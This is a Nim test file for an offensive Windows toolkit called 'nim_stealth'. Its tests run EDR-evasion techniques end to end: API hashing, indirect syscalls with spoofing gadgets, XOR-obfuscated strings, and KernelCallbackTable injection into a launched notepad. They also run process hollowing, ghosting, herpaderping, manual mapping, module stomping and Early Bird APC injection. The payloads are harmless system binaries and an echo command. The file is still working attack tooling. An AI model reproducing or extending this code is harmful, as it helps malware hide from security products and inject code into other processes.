## test_all.nim -- nim_stealth full test suite
## Compile: nim c -d:release -d:danger --opt:speed --mm:orc --passL:-lpsapi -o:tests\test_all.exe tests\test_all.nim
## Run as Administrator for full test coverage

import winim, os, strutils, osproc, times, math

import ../core/resolver
import ../core/syscalls
import ../core/stealth_macros
import ../kct/kct_core
import ../kct/phantom_fiber_v4
import ../injection/ghosting
import ../injection/hollowing
import ../injection/herpaderping
import ../injection/mapper
import ../injection/stomping
import ../injection/threadless

# ===========================================================================
# Output helpers
# ===========================================================================

const
    C_RESET  = "\x1b[0m"
    C_GREEN  = "\x1b[32m"
    C_RED    = "\x1b[31m"
    C_YELLOW = "\x1b[33m"
    C_CYAN   = "\x1b[36m"
    C_BOLD   = "\x1b[1m"

var nPass = 0
var nFail = 0
var nSkip = 0

proc hdr(title: string) =
    echo ""
    echo C_BOLD & C_CYAN & "==========================================" & C_RESET
    echo C_BOLD & C_CYAN & "  " & title & C_RESET
    echo C_BOLD & C_CYAN & "==========================================" & C_RESET

proc pass_test(msg: string) =
    echo C_GREEN & "  [PASS] " & C_RESET & msg
    nPass += 1

proc fail_test(msg: string) =
    echo C_RED & "  [FAIL] " & C_RESET & msg
    nFail += 1

proc skip_test(msg: string) =
    echo C_YELLOW & "  [SKIP] " & C_RESET & msg
    nSkip += 1

proc info_msg(msg: string) =
    echo "  " & C_CYAN & "-> " & C_RESET & msg

proc chk(cond: bool, pass_msg: string, fail_msg: string) =
    if cond: pass_test(pass_msg)
    else: fail_test(fail_msg)

# ===========================================================================
# Utilities
# ===========================================================================

proc find_pid(name: string): DWORD =
    var snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == INVALID_HANDLE_VALUE: return 0
    var pe: PROCESSENTRY32
    pe.dwSize = sizeof(PROCESSENTRY32).DWORD
    if Process32First(snapshot, addr pe) != 0:
        while true:
            var exeName = ""
            for x in pe.szExeFile: exeName.add(if x != 0: char(x) else: '\0')
            exeName = exeName.strip(chars={'\0'})
            if exeName.toLowerAscii() == name.toLowerAscii():
                CloseHandle(snapshot)
                return pe.th32ProcessID
            if Process32Next(snapshot, addr pe) == 0: break
    CloseHandle(snapshot)
    return 0

proc find_tid(pid: DWORD): DWORD =
    var snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snapshot == INVALID_HANDLE_VALUE: return 0
    var te: THREADENTRY32
    te.dwSize = sizeof(THREADENTRY32).DWORD
    if Thread32First(snapshot, addr te) != 0:
        while true:
            if te.th32OwnerProcessID == pid:
                CloseHandle(snapshot)
                return te.th32ThreadID
            if Thread32Next(snapshot, addr te) == 0: break
    CloseHandle(snapshot)
    return 0

proc open_proc_all(pid: DWORD): HANDLE =
    var oa: OBJECT_ATTRIBUTES
    var ci: CLIENT_ID
    ZeroMemory(addr oa, sizeof(oa)); ZeroMemory(addr ci, sizeof(ci))
    oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
    ci.UniqueProcess = cast[HANDLE](pid)
    var h: HANDLE = 0
    discard syscalls.NtOpenProcess(addr h, PROCESS_ALL_ACCESS, addr oa, addr ci)
    return h

proc read_pe(path: string): seq[byte] =
    try:
        let raw = readFile(path)
        result = newSeq[byte](raw.len)
        copyMem(addr result[0], unsafeAddr raw[0], raw.len)
    except: result = @[]

proc wait_for_file(path: string, timeout_ms: int): bool =
    let deadline = getTime() + initDuration(milliseconds = timeout_ms)
    while getTime() < deadline:
        if fileExists(path): return true
        sleep(100)
    return false

# ===========================================================================
# TEST 1: core/resolver -- PEB walking + API hashing
# ===========================================================================

proc test_resolver() =
    hdr("TEST 1: core/resolver -- PEB Walking + API Hashing")

    let ntdll_hash = hash_api("ntdll.dll")
    chk(ntdll_hash != 0,
        "hash_api(\"ntdll.dll\") = 0x" & ntdll_hash.toHex(),
        "hash_api returned 0")

    let ntdll = get_module_base(H"ntdll.dll")
    chk(ntdll != nil,
        "get_module_base(ntdll.dll) = 0x" & cast[uint](ntdll).toHex(),
        "ntdll base address: nil")

    let k32 = get_module_base(H"kernel32.dll")
    chk(k32 != nil,
        "get_module_base(kernel32.dll) = 0x" & cast[uint](k32).toHex(),
        "kernel32 base address: nil")

    if ntdll != nil:
        let pAlloc = get_proc_address_hashed(ntdll, H"NtAllocateVirtualMemory")
        chk(pAlloc != nil,
            "get_proc_address_hashed(NtAllocateVirtualMemory) = 0x" & cast[uint](pAlloc).toHex(),
            "NtAllocateVirtualMemory: nil")

        let pWrite = get_proc_address_hashed(ntdll, H"NtWriteVirtualMemory")
        chk(pWrite != nil,
            "get_proc_address_hashed(NtWriteVirtualMemory) = 0x" & cast[uint](pWrite).toHex(),
            "NtWriteVirtualMemory: nil")

    if k32 != nil:
        let pWinExec = get_proc_address_hashed(k32, H"WinExec")
        chk(pWinExec != nil,
            "get_proc_address_hashed(WinExec) = 0x" & cast[uint](pWinExec).toHex(),
            "WinExec: nil")

    # Compile-time vs runtime hash consistency
    let ct = H"ntdll.dll"
    let rt = hash_api("ntdll.dll")
    chk(ct == rt,
        "Compile-time H\"ntdll.dll\" (0x" & ct.toHex() & ") == runtime hash_api (0x" & rt.toHex() & ")",
        "Hash mismatch: 0x" & ct.toHex() & " vs 0x" & rt.toHex())

# ===========================================================================
# TEST 2: core/syscalls -- Indirect syscalls + SSN cache
# ===========================================================================

proc test_syscalls() =
    hdr("TEST 2: core/syscalls -- Indirect Syscalls + SSN Cache")

    let ssn_alloc = get_ssn_from_disk_internal(H"NtAllocateVirtualMemory")
    chk(ssn_alloc != 0 and ssn_alloc < 0x300,
        "NtAllocateVirtualMemory SSN = 0x" & ssn_alloc.toHex(),
        "NtAllocateVirtualMemory SSN failed")

    let ssn_write = get_ssn_from_disk_internal(H"NtWriteVirtualMemory")
    chk(ssn_write != 0,
        "NtWriteVirtualMemory SSN = 0x" & ssn_write.toHex(),
        "NtWriteVirtualMemory SSN failed")

    let ssn_query = get_ssn_from_disk_internal(H"NtQueryInformationProcess")
    chk(ssn_query != 0,
        "NtQueryInformationProcess SSN = 0x" & ssn_query.toHex(),
        "NtQueryInformationProcess SSN failed")

    let ntdll = get_module_base(H"ntdll.dll")
    let gadget = find_syscall_gadget_v2(ntdll)
    chk(gadget != nil,
        "syscall;ret gadget = 0x" & cast[uint](gadget).toHex(),
        "syscall;ret gadget not found")

    let spoof_g = find_spoof_gadget()
    chk(spoof_g != nil,
        "jmp rbx spoofer gadget = 0x" & cast[uint](spoof_g).toHex(),
        "jmp rbx spoofer gadget not found")

    # SSN cache performance
    let t0 = cpuTime()
    for _ in 0..99:
        discard cached_ssn(H"NtAllocateVirtualMemory")
    let cached_time = (cpuTime() - t0) * 1000.0
    info_msg("cached_ssn x100: " & $(cached_time.round(3)) & " ms")

    # Real indirect syscall: allocate / write / read / protect / free
    var base: pointer = nil
    var sz: SIZE_T = 4096
    let st_alloc = syscalls.NtAllocateVirtualMemory(cast[HANDLE](-1), addr base, 0, addr sz,
                                            MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    chk(st_alloc == 0 and base != nil,
        "NtAllocateVirtualMemory(self) -> 0x" & cast[uint](base).toHex(),
        "NtAllocateVirtualMemory failed: 0x" & cast[uint32](st_alloc).toHex())

    if base != nil:
        let pattern: array[4, byte] = [0xDE.byte, 0xAD, 0xBE, 0xEF]
        var written: SIZE_T
        let st_write = syscalls.NtWriteVirtualMemory(cast[HANDLE](-1), base,
                                             unsafeAddr pattern[0], 4, addr written)
        chk(st_write == 0 and written == 4,
            "NtWriteVirtualMemory(self, 4 bytes)",
            "NtWriteVirtualMemory failed: 0x" & cast[uint32](st_write).toHex())

        var buf: array[4, byte]
        var readBytes: SIZE_T
        let st_read = syscalls.NtReadVirtualMemory(cast[HANDLE](-1), base, addr buf[0], 4, addr readBytes)
        chk(st_read == 0 and buf == pattern,
            "NtReadVirtualMemory = 0xDEADBEEF confirmed",
            "NtReadVirtualMemory failed or value mismatch")

        var oldProt: ULONG
        var bPtr = base; var bSz = sz
        let st_prot = syscalls.NtProtectVirtualMemory(cast[HANDLE](-1), addr bPtr, addr bSz,
                                              PAGE_EXECUTE_READ, addr oldProt)
        chk(st_prot == 0,
            "NtProtectVirtualMemory -> PAGE_EXECUTE_READ (oldProt=0x" & oldProt.toHex() & ")",
            "NtProtectVirtualMemory failed: 0x" & cast[uint32](st_prot).toHex())

        var fBase = base; var fSz: SIZE_T = 0
        let st_free = syscalls.NtFreeVirtualMemory(cast[HANDLE](-1), addr fBase, addr fSz, MEM_RELEASE)
        chk(st_free == 0,
            "NtFreeVirtualMemory success",
            "NtFreeVirtualMemory failed: 0x" & cast[uint32](st_free).toHex())

    # NtQueryInformationProcess (new indirect syscall)
    var pbi: PROCESS_BASIC_INFORMATION
    var retLen: ULONG
    let st_qip = syscalls.NtQueryInformationProcess(cast[HANDLE](-1), 0, addr pbi,
                                            sizeof(pbi).ULONG, addr retLen)
    chk(st_qip == 0 and pbi.PebBaseAddress != nil,
        "NtQueryInformationProcess(self) -> PEB=0x" & cast[uint](pbi.PebBaseAddress).toHex(),
        "NtQueryInformationProcess failed: 0x" & cast[uint32](st_qip).toHex())

# ===========================================================================
# TEST 3: core/stealth_macros -- XOR string encryption
# ===========================================================================

proc test_macros() =
    hdr("TEST 3: core/stealth_macros -- Compile-time XOR Encryption")

    const ENC_T1 = enc("NtAllocateVirtualMemory")
    let dec1 = dec(ENC_T1)
    chk(dec1 == "NtAllocateVirtualMemory",
        "enc/dec roundtrip: \"NtAllocateVirtualMemory\"",
        "enc/dec mismatch: \"" & dec1 & "\"")

    const ENC_T2 = enc("ntdll.dll")
    let dec2 = dec(ENC_T2)
    chk(dec2 == "ntdll.dll",
        "enc/dec roundtrip: \"ntdll.dll\"",
        "enc/dec failed: \"" & dec2 & "\"")

    chk(ENC_T1[0] != ord('N').byte,
        "Encrypted byte[0]=0x" & ENC_T1[0].toHex() & " != 'N'(0x4E) -- XOR applied",
        "Encryption NOT applied (first byte == plaintext)")

# ===========================================================================
# TEST 4: kct/kct_core -- KCT read + index search
# ===========================================================================

proc test_kct_core() =
    hdr("TEST 4: kct/kct_core -- KCT Read + Index Search")

    discard LoadLibraryA("user32.dll") # KCT 인덱스 탐색을 위해 현재 프로세스에 user32 강제 로드

    info_msg("Launching notepad.exe...")
    let p = startProcess("notepad.exe")
    sleep(1500)
    let pid = find_pid("notepad.exe")

    if pid == 0:
        skip_test("notepad.exe PID not found -- skipping KCT test")
        p.close(); return

    info_msg("notepad.exe PID: " & $pid)
    let hProc = open_proc_all(pid)
    if hProc == 0:
        skip_test("OpenProcess failed -- need admin?")
        p.close(); return

    let kct = read_kct(hProc)
    chk(kct != nil,
        "read_kct(notepad) = 0x" & cast[uint](kct).toHex(),
        "read_kct failed -- could not read PEB+0x58")

    if kct != nil:
        for i in 0..4:
            var val: pointer
            var br: SIZE_T
            discard syscalls.NtReadVirtualMemory(hProc,
                cast[pointer](cast[uint64](kct) + (i * 8).uint64),
                addr val, 8, addr br)
            info_msg("  KCT[" & $i & "] = 0x" & cast[uint](val).toHex())

    let idx = find_kct_index("__ClientEventCallbackWorker")
    if idx >= 0:
        pass_test("find_kct_index(\"__ClientEventCallbackWorker\") = " & $idx)
    else:
        info_msg("find_kct_index returned " & $idx & " (user32.dll may not be loaded)")

    CloseHandle(hProc)
    p.close()
    discard TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, pid), 0)

# ===========================================================================
# TEST 5: kct/phantom_fiber_v4 -- KCT Phantom Fiber v4 injection
# ===========================================================================

proc test_kct_inject() =
    hdr("TEST 5: kct/phantom_fiber_v4 -- KCT Phantom Fiber v4")

    let resultFile = getEnv("TEMP") & "\\stealth_kct_test.txt"
    if fileExists(resultFile): discard os.tryRemoveFile(resultFile)

    discard LoadLibraryA("user32.dll") # KCT 인덱스 탐색을 위해 user32.dll 강제 로드

    info_msg("Launching notepad.exe...")
    let p = startProcess("notepad.exe")
    sleep(1500)
    let pid = find_pid("notepad.exe")

    if pid == 0:
        skip_test("notepad.exe PID not found")
        p.close(); return

    let hProc = open_proc_all(pid)
    if hProc == 0:
        skip_test("OpenProcess failed -- need admin")
        p.close(); return

    let cmd = "cmd.exe /c echo KCT_OK > " & resultFile
    info_msg("Command: " & cmd)

    let injected = inject_phantom_fiber_v4(hProc, 2, cmd)
    chk(injected,
        "inject_phantom_fiber_v4 returned true",
        "inject_phantom_fiber_v4 failed")

    CloseHandle(hProc)

    if injected:
        info_msg("Waiting for KCT trigger (max 8s)...")
        let hwnd = FindWindowA("Notepad", nil)
        for _ in 0..20:
            if fileExists(resultFile): break
            if hwnd != 0: discard PostMessageA(hwnd, WM_NULL, 0, 0)
            sleep(400)

        chk(fileExists(resultFile),
            "Result file created: " & resultFile,
            "Result file not created -- KCT not triggered yet (needs Win32 message pump)")
        if fileExists(resultFile): discard os.tryRemoveFile(resultFile)

    p.close()
    discard TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, pid), 0)

# ===========================================================================
# TEST 6: injection/hollowing -- Process Hollowing (RunPE)
# ===========================================================================

proc test_hollowing() =
    hdr("TEST 6: injection/hollowing -- Process Hollowing (RunPE)")

    let payload_path = "C:\\Windows\\System32\\notepad.exe"
    let target_path  = "C:\\Windows\\System32\\cmd.exe"
    info_msg("Payload: " & payload_path)
    info_msg("Target:  " & target_path)

    let payload = read_pe(payload_path)
    if payload.len == 0:
        skip_test("Failed to read payload: " & payload_path); return

    info_msg("PE size: " & $(payload.len div 1024) & " KB")
    let hProc = run_pe(payload, target_path)
    chk(hProc != 0,
        "Process Hollowing success -> HANDLE=0x" & cast[uint](hProc).toHex(),
        "run_pe failed (returned 0)")

    if hProc != 0:
        sleep(1000)
        var ec: DWORD
        GetExitCodeProcess(hProc, addr ec)
        info_msg("ExitCode: 0x" & ec.toHex() & " (" & (if ec == STILL_ACTIVE: "ALIVE" else: "DEAD") & ")")
        discard TerminateProcess(hProc, 0)
        CloseHandle(hProc)

# ===========================================================================
# TEST 7: injection/ghosting -- Process Ghosting
# ===========================================================================

proc test_ghosting() =
    hdr("TEST 7: injection/ghosting -- Process Ghosting")

    let payload_path = "C:\\Windows\\System32\\notepad.exe"
    info_msg("Payload: " & payload_path)

    let payload = read_pe(payload_path)
    if payload.len == 0:
        skip_test("Failed to read payload"); return

    let hProc = ghost_process(payload, "C:\\Windows\\System32\\notepad.exe")
    chk(hProc != 0,
        "Process Ghosting success -> HANDLE=0x" & cast[uint](hProc).toHex(),
        "ghost_process failed")

    if hProc != 0:
        sleep(1000)
        var ec: DWORD
        GetExitCodeProcess(hProc, addr ec)
        info_msg("ExitCode: 0x" & ec.toHex() & " (" & (if ec == STILL_ACTIVE: "ALIVE" else: "DEAD") & ")")
        discard TerminateProcess(hProc, 0)
        CloseHandle(hProc)

# ===========================================================================
# TEST 8: injection/herpaderping -- Process Herpaderping
# ===========================================================================

proc test_herpaderping() =
    hdr("TEST 8: injection/herpaderping -- Process Herpaderping")

    let payload_path = "C:\\Windows\\System32\\notepad.exe"
    info_msg("Payload: " & payload_path & " (disk gets overwritten with notepad)")

    let payload = read_pe(payload_path)
    if payload.len == 0:
        skip_test("Failed to read payload"); return

    let hProc = herpaderp_process(payload, "C:\\Windows\\System32\\notepad.exe")
    chk(hProc != 0,
        "Process Herpaderping success -> HANDLE=0x" & cast[uint](hProc).toHex(),
        "herpaderp_process failed")

    if hProc != 0:
        sleep(1000)
        var ec: DWORD
        GetExitCodeProcess(hProc, addr ec)
        info_msg("ExitCode: 0x" & ec.toHex() & " (" & (if ec == STILL_ACTIVE: "ALIVE" else: "DEAD") & ")")
        discard TerminateProcess(hProc, 0)
        CloseHandle(hProc)

# ===========================================================================
# TEST 9: injection/mapper -- Manual Map
# ===========================================================================

proc test_manual_map() =
    hdr("TEST 9: injection/mapper -- Manual Map (Reflective DLL)")

    let dll_path = "C:\\Windows\\System32\\winmm.dll"
    info_msg("Payload DLL: " & dll_path)

    let dll_bytes = read_pe(dll_path)
    if dll_bytes.len == 0:
        skip_test("Failed to read DLL: " & dll_path); return

    info_msg("DLL size: " & $(dll_bytes.len div 1024) & " KB")
    let ep = manual_map(cast[HANDLE](-1), unsafeAddr dll_bytes[0], false)
    chk(ep != 0,
        "manual_map(self, winmm.dll) entry stub = 0x" & ep.toHex(),
        "manual_map failed (entry=0)")

    if ep != 0:
        info_msg("DllMain stub at 0x" & ep.toHex() & " (not called -- needs separate thread)")

# ===========================================================================
# TEST 10: injection/stomping -- Module Stomping
# ===========================================================================

proc test_module_stomping() =
    hdr("TEST 10: injection/stomping -- Module Stomping")

    let payload_path = "C:\\Windows\\System32\\notepad.exe"
    let target_path  = "C:\\Windows\\System32\\cmd.exe"
    let sacrifice    = "C:\\Windows\\System32\\windows.storage.dll" # amsi.dll은 크기가 너무 작아서 notepad.exe 탑재 실패 발생
    info_msg("Payload:    " & payload_path)
    info_msg("Target:     " & target_path)
    info_msg("Sacrifice:  " & sacrifice)

    let payload = read_pe(payload_path)
    if payload.len == 0:
        skip_test("Failed to read payload"); return

    let hProc = module_stomping(payload, target_path, sacrifice)
    chk(hProc != 0,
        "Module Stomping success -> HANDLE=0x" & cast[uint](hProc).toHex(),
        "module_stomping failed")

    if hProc != 0:
        sleep(800)
        var ec: DWORD
        GetExitCodeProcess(hProc, addr ec)
        info_msg("ExitCode: 0x" & ec.toHex() & " (" & (if ec == STILL_ACTIVE: "ALIVE" else: "DEAD") & ")")
        discard TerminateProcess(hProc, 0)
        CloseHandle(hProc)

# ===========================================================================
# TEST 11: injection/threadless -- Early Bird APC
# ===========================================================================

proc test_early_bird() =
    hdr("TEST 11: injection/threadless -- Early Bird APC")

    let payload_path = "C:\\Windows\\System32\\notepad.exe"
    let target_path  = "C:\\Windows\\System32\\cmd.exe"
    info_msg("Payload: " & payload_path)
    info_msg("Target:  " & target_path)

    let payload = read_pe(payload_path)
    if payload.len == 0:
        skip_test("Failed to read payload"); return

    let result = run_early_bird(payload, target_path)
    chk(result,
        "Early Bird APC injection success",
        "run_early_bird failed")

# ===========================================================================
# TEST 12: Handle ops -- NtOpenProcess / NtSuspendProcess / NtTerminateProcess
# ===========================================================================

proc test_handle_ops() =
    hdr("TEST 12: Handle Ops -- NtOpenProcess / NtSuspend / NtTerminate")

    info_msg("Launching notepad.exe...")
    let p = startProcess("notepad.exe")
    sleep(1000)
    let pid = find_pid("notepad.exe")

    if pid == 0:
        skip_test("notepad PID not found")
        p.close(); return

    var oa: OBJECT_ATTRIBUTES; var ci: CLIENT_ID
    ZeroMemory(addr oa, sizeof(oa)); ZeroMemory(addr ci, sizeof(ci))
    oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
    ci.UniqueProcess = cast[HANDLE](pid)

    var hProc: HANDLE = 0
    let st_open = syscalls.NtOpenProcess(addr hProc, PROCESS_ALL_ACCESS, addr oa, addr ci)
    chk(st_open == 0 and hProc != 0,
        "NtOpenProcess(notepad, PID=" & $pid & ") -> HANDLE=0x" & cast[uint](hProc).toHex(),
        "NtOpenProcess failed: 0x" & cast[uint32](st_open).toHex())

    if hProc != 0:
        let st_sus = syscalls.NtSuspendProcess(hProc)
        chk(st_sus == 0,
            "NtSuspendProcess success",
            "NtSuspendProcess failed: 0x" & cast[uint32](st_sus).toHex())

        let st_term = syscalls.NtTerminateProcess(hProc, cast[NTSTATUS](0xDEADBEEF))
        chk(st_term == 0,
            "NtTerminateProcess(0xDEADBEEF) success",
            "NtTerminateProcess failed: 0x" & cast[uint32](st_term).toHex())
        CloseHandle(hProc)

    p.close()

# ===========================================================================
# MAIN
# ===========================================================================

proc main() =
    discard SetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), 7)

    echo ""
    echo C_BOLD & C_CYAN
    echo "  +------------------------------------------+"
    echo "  |   nim_stealth Full Test Suite            |"
    echo "  |   2026-03-01  |  x64 Windows             |"
    echo "  +------------------------------------------+"
    echo C_RESET

    let t_start = cpuTime()

    test_resolver()
    test_syscalls()
    test_macros()
    test_kct_core()
    test_kct_inject()
    test_hollowing()
    test_ghosting()
    test_herpaderping()
    test_manual_map()
    test_module_stomping()
    test_early_bird()
    test_handle_ops()

    let elapsed = cpuTime() - t_start

    echo ""
    echo C_BOLD & "==========================================" & C_RESET
    echo C_BOLD & " Results" & C_RESET
    echo C_BOLD & "==========================================" & C_RESET
    echo C_GREEN  & "  PASS: " & $nPass & C_RESET
    echo C_RED    & "  FAIL: " & $nFail & C_RESET
    echo C_YELLOW & "  SKIP: " & $nSkip & C_RESET
    echo "  Time:  " & $(elapsed.round(2)) & "s"
    echo ""
    if nFail == 0:
        echo C_BOLD & C_GREEN & "  All tests passed!" & C_RESET
    else:
        echo C_BOLD & C_RED & "  " & $nFail & " test(s) failed" & C_RESET
    echo ""

main()
